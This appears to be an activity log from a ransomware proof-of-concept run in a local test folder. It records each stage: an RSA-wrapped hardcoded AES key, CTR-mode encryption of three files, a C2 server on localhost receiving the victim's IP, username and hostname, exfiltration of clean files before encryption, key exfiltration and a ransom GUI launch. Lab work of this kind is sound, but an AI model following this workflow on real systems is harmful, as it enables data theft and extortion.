2025-06-25 11:37:57,746 - INFO - ============================================================
2025-06-25 11:37:57,746 - INFO - RANSOMWARE PoC ACTIVITY LOG STARTED
2025-06-25 11:37:57,747 - INFO - ============================================================
2025-06-25 11:37:57,747 - INFO - Log file: logs/ransomware_activity_20250625_113757.log
2025-06-25 11:37:57,748 - INFO - Timestamp: 2025-06-25 11:37:57
2025-06-25 11:37:58,054 - INFO - Platform: Windows 11
2025-06-25 11:37:58,055 - INFO - Python version: 3.13.5 (tags/v3.13.5:6cb20a2, Jun 11 2025, 16:15:46) [MSC v.1943 64 bit (AMD64)]
2025-06-25 11:37:58,055 - INFO - User: mudit
2025-06-25 11:37:58,056 - INFO - Hostname: Mudityadev
2025-06-25 11:37:58,056 - INFO - ============================================================
2025-06-25 11:37:58,057 - INFO - Starting main function
2025-06-25 11:37:58,057 - INFO - Parsing command line arguments
2025-06-25 11:37:58,058 - INFO - Setting up argument parser
2025-06-25 11:37:58,059 - INFO - Parsing command line arguments
2025-06-25 11:37:58,060 - INFO - Arguments parsed - Path: D:\AI-Agent\Ransomware-PoC\testDir, Encrypt: True, Decrypt: False
2025-06-25 11:37:58,060 - INFO - Operation mode: ENCRYPT
2025-06-25 11:37:58,060 - INFO - Target path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:37:58,061 - INFO - Using specified path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:37:58,061 - INFO - Initializing RSA encryption for AES key
2025-06-25 11:37:58,125 - INFO - AES key encrypted with RSA public key
2025-06-25 11:37:58,126 - INFO - Encrypted key (base64): fb8gp7HGjS9quzP7S63kp2Q3TiGCBpZ1kbko6iHfoNgoFHh1KFfTC1sxhjjHijJ3zSPnv8YRgM2mWjFzwShrgtwXXKGNQsPhu6jkPFI9U4MbWvTf1wQtIh6SJDQGYNfaxFWjTli3bm5a/644rJxfZdDr0VF8UX5nUh3o/RAg+hJ378h1v4qzA8cRpQfN5qKL7lPwipuUe3aENuLe/0h+a5tNtkv1FCJ+Q0sqIUvfzMPbLkLUOJth3goFA33hO4jh+kzSkVJDKd7yKOg4sqMLMYADwNR+pwtDnv5UJh9VYKTtKWhp4d4FdqXBFO06grqaZswA8yE9qSgfiyAhUZZ5mA==
2025-06-25 11:37:58,126 - INFO - Using hardcoded AES key for encryption
2025-06-25 11:37:58,127 - INFO - Creating AES cipher with CTR mode
2025-06-25 11:37:58,134 - INFO - Starting file discovery and processing
2025-06-25 11:37:58,134 - INFO - Connecting to C2 server BEFORE encryption to copy clean files
2025-06-25 11:37:58,135 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
2025-06-25 11:37:58,138 - INFO - Retrieving local IP address
2025-06-25 11:37:58,139 - INFO - Local IP address: 192.168.217.136
2025-06-25 11:37:58,141 - INFO - Successfully sent target directory to C2 server: 127.0.0.1:8080
2025-06-25 11:37:58,141 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev, TargetDir=D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:37:58,142 - INFO - C2 server will now copy clean files before encryption begins
2025-06-25 11:37:58,143 - INFO - Waiting for C2 server to complete file exfiltration...
2025-06-25 11:38:00,144 - INFO - Proceeding with file encryption...
2025-06-25 11:38:00,144 - INFO - Processing directory: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:38:00,146 - INFO - Discovered 3 files in D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:38:00,147 - INFO - Total files processed: 3
2025-06-25 11:38:00,147 - INFO - Starting key exfiltration and GUI launch
2025-06-25 11:38:00,148 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
2025-06-25 11:38:00,163 - INFO - Retrieving local IP address
2025-06-25 11:38:00,164 - INFO - Local IP address: 192.168.217.136
2025-06-25 11:38:00,165 - INFO - Successfully sent data to C2 server: 127.0.0.1:8080
2025-06-25 11:38:00,166 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev, TargetDir=D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:38:00,166 - INFO - Launching GUI window
2025-06-25 11:38:23,684 - INFO - Received keyboard interrupt, exiting
